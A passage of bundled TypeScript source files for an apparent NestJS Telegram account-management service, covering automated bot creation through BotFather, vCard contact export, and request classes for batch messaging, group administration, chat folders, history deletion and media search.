chars.length));\n                }\n                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;\n                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);\n            }\n\n            console.log(`[BOT CREATION] Sending bot username: \"${botUsername}\"`);\n            await this.client.sendMessage(entity, {\n                message: botUsername\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Get response from BotFather\n            console.log('[BOT CREATION] Retrieving response from BotFather...');\n            const messages = await this.client.getMessages(entity, {\n                limit: 1\n            });\n\n            if (!messages || messages.length === 0) {\n                console.error('[BOT CREATION] No response received from BotFather');\n                throw new Error('No response received from BotFather');\n            }\n\n            const lastMessage = messages[0].message;\n            console.log(`[BOT CREATION] BotFather response: \"${lastMessage.substring(0, 50)}...\"`);\n\n            if (!lastMessage.toLowerCase().includes('use this token')) {\n                console.error(`[BOT CREATION] Bot creation failed, unexpected response: \"${lastMessage}\"`);\n                throw new Error(`Bot creation failed: ${lastMessage}`);\n            }\n\n            // Extract bot token from BotFather's response\n            const tokenMatch = lastMessage.match(/(\\d+:[A-Za-z0-9_-]+)/);\n            if (!tokenMatch) {\n                console.error('[BOT CREATION] Could not extract bot token from BotFather response');\n                throw new Error('Could not extract bot token from BotFather response');\n            }\n            const botToken = tokenMatch[0];\n            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);\n\n            // If description is provided, set it\n            if (options.description) {\n                console.log('[BOT CREATION] Setting bot description...');\n                await this.client.sendMessage(entity, { message: '/setdescription' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending description text...');\n                await this.client.sendMessage(entity, { message: options.description });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] Description set successfully');\n            }\n\n            // If about text is provided, set it\n            if (options.aboutText) {\n                console.log('[BOT CREATION] Setting about text...');\n                await this.client.sendMessage(entity, { message: '/setabouttext' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending about text...');\n                await this.client.sendMessage(entity, { message: options.aboutText });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] About text set successfully');\n            }\n\n            // If profile photo URL is provided, set it\n            if (options.profilePhotoUrl) {\n                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);\n                try {\n                    console.log('[BOT CREATION] Downloading profile photo...');\n                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);\n                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);\n\n                    console.log('[BOT CREATION] Sending /setuserpic command...');\n                    await this.client.sendMessage(entity, { message: '/setuserpic' });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);\n                    await this.client.sendMessage(entity, { message: `@${options.username}` });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log('[BOT CREATION] Uploading profile photo...');\n                    await this.client.sendFile(entity, {\n                        file: Buffer.from(photoBuffer),\n                        caption: '',\n                        forceDocument: false\n                    });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n                    console.log('[BOT CREATION] Profile photo set successfully');\n                } catch (photoError) {\n                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);\n                    // Continue with bot creation even if photo upload fails\n                }\n            }\n\n            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);\n            return {\n                botToken,\n                username: botUsername\n            };\n\n        } catch (error) {\n            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);\n            throw new Error(`Failed to create bot: ${error.message}`);\n        }\n    }\n\n    private createVCardContent(contacts: Api.contacts.Contacts): string {\n        let vCardContent = '';\n        contacts.users.map((user: Api.TypeUser) => {\n            user = user as Api.User;\n            vCardContent += 'BEGIN:VCARD\\n';\n            vCardContent += 'VERSION:3.0\\n';\n            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\\n`;\n            vCardContent += `TEL;TYPE=CELL:${user.phone}\\n`;\n            vCardContent += 'END:VCARD\\n';\n        }\n        );\n        return vCardContent;\n    }\n\n    async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename = 'contacts.vcf'): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const vCardContent = this.createVCardContent(contacts);\n            const tempPath = `./contacts/${chatId}-${filename}`;\n\n            // Ensure the directory exists\n            if (!fs.existsSync('./contacts')) {\n                fs.mkdirSync('./contacts', { recursive: true });\n            }\n\n            // Write vCard content to a temporary file\n            fs.writeFileSync(tempPath, vCardContent, 'utf8');\n\n            try {\n                // Read the file content for sending\n                const fileContent = fs.readFileSync(tempPath);\n\n                // Send file with the actual content\n                const file = new CustomFile(\n                    filename,\n                    fs.statSync(tempPath).size,\n                    tempPath,\n                    fileContent // Add the actual file content\n                );\n\n                await this.client.sendFile(chatId, {\n                    file,\n                    caption: `Contacts file with ${contacts.users.length} contacts`,\n                    forceDocument: true\n                });\n\n                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);\n            } finally {\n                // Clean up temp file\n                if (fs.existsSync(tempPath)) {\n                    fs.unlinkSync(tempPath);\n                }\n            }\n        } catch (error) {\n            console.error('Error sending contacts file:', error);\n            throw error; // Re-throw the error for proper handling by caller\n        }\n    }\n}\nexport default TelegramManager;\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  @ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class ConnectionStatusDto {\r\n  @ApiProperty({ description: 'Number of active connections' })\r\n  activeConnections: number;\r\n\r\n  @ApiProperty({ description: 'Number of rate-limited connections' })\r\n  rateLimited: number;\r\n\r\n  @ApiProperty({ description: 'Total number of operations' })\r\n  totalOperations: number;\r\n}\r\nexport class ChatStatisticsDto {\r\n  @ApiProperty({ description: 'Total message count' })\r\n  totalMessages: number;\r\n\r\n  @ApiProperty({ description: 'Active member count' })\r\n  activeMembers: number;\r\n\r\n  @ApiProperty({ description: 'Message count by type' })\r\n  messageTypes: {\r\n    text: number;\r\n    photo: number;\r\n    video: number;\r\n    voice: number;\r\n    document: number;\r\n  };\r\n\r\n  @ApiProperty({ description: 'Most active hours', type: [Number] })\r\n  activeHours: number[];\r\n\r\n  @ApiProperty({ description: 'Activity trend percentage' })\r\n  activityTrend: number;\r\n}","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsNotEmpty, IsString, IsOptional, MaxLength } from 'class-validator';\n\nexport class CreateBotDto {\n    @ApiProperty({\n        description: 'Name of the bot (required)',\n        example: 'MyAwesomeBot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(64)\n    name: string;\n\n    @ApiProperty({\n        description: 'Username for the bot (required)',\n        example: 'my_awesome_bot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(32)\n    username: string;\n\n    @ApiProperty({\n        description: 'Description of what your bot can do',\n        example: 'This bot helps you manage your tasks',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    description?: string;\n\n    @ApiProperty({\n        description: 'What the bot can be used for',\n        example: 'Task Management, Reminders, Notes',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    aboutText?: string;\n\n    @ApiProperty({\n        description: 'URL to the bot\\'s profile photo',\n        example: 'https://example.com/bot-photo.jpg',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    profilePhotoUrl?: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsBoolean, IsInt, IsOptional, IsString } from 'class-validator';\n\nexport class DeleteHistoryDto {\n  @ApiProperty({\n    description: 'Username or peer ID of the chat whose history you want to delete',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiPropertyOptional({\n    description: 'Deletes all messages with IDs less than or equal to this value',\n  })\n  @IsOptional()\n  @IsInt()\n  maxId?: number;\n\n  @ApiPropertyOptional({\n    description: 'If true, clears the history only for the current user without deleting for others',\n    default: true,\n  })\n  @IsOptional()\n  @IsBoolean()\n  justClear: boolean = true;\n\n  @ApiPropertyOptional({\n    description: 'If true, deletes the message history for all participants (if permitted)',\n    default: false,\n  })\n  @IsOptional()\n  @IsBoolean()\n  revoke: boolean = false;\n\n  @ApiPropertyOptional({\n    description: 'Minimum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  minDate?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  maxDate?: number;\n}\n","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS = 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiPropertyOptional({ description: 'Group title', required: false })\r\n  @IsString()\r\n  @IsOptional()\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group username', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  @IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}\r\n\r\nexport class createGroupDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number = 0;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a broadcast', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  broadcast?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\nexport * from './view-once-media.dto';\r\nexport * from './create-bot.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type } from 'class-transformer';\r\nimport {\r\n  IsString,\r\n  IsOptional,\r\n  IsArray,\r\n  IsNumber,\r\n  IsEnum,\r\n  IsDate,\r\n  Min,\r\n  Max,\r\n  IsInt,\r\n  ValidateNested,\r\n  ArrayMinSize,\r\n  ArrayMaxSize\r\n} from 'class-validator';\r\n\r\n/**\r\n * Enum for message media types that can be searched\r\n */\r\nexport enum MessageMediaType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document',\r\n  ROUND_VIDEO = 'roundVideo',\r\n  ROUND_VOICE = 'roundVoice',\r\n  STICKER = 'sticker',\r\n  ANIMATION = 'animation',\r\n  CONTACT = 'contact',\r\n  MUSIC = 'music',\r\n  CHAT_PHOTO = 'chatPhoto',\r\n}\r\n\r\n/**\r\n * Enum for search scope\r\n */\r\nexport enum SearchScope {\r\n  CHAT = 'chat',\r\n  GLOBAL = 'global'\r\n}\r\n\r\n/**\r\n * DTO for search messages request\r\n */\r\nexport class SearchMessagesDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Chat ID to search in (required for chat-specific search)',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Search query string',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  query?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Types of messages to search for',\r\n    enum: MessageMediaType,\r\n    isArray: true,\r\n    required: false,\r\n  })\r\n  @IsArray()\r\n  @IsEnum(MessageMediaType, { each: true })\r\n  @IsOptional()\r\n  types?: MessageMediaType[] = [MessageMediaType.ALL];\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  minId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  maxId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of messages to retrieve',\r\n    minimum: 1,\r\n    maximum: 500,\r\n  })\r\n  @IsInt()\r\n  @Min(1)\r\n  @Max(500)\r\n  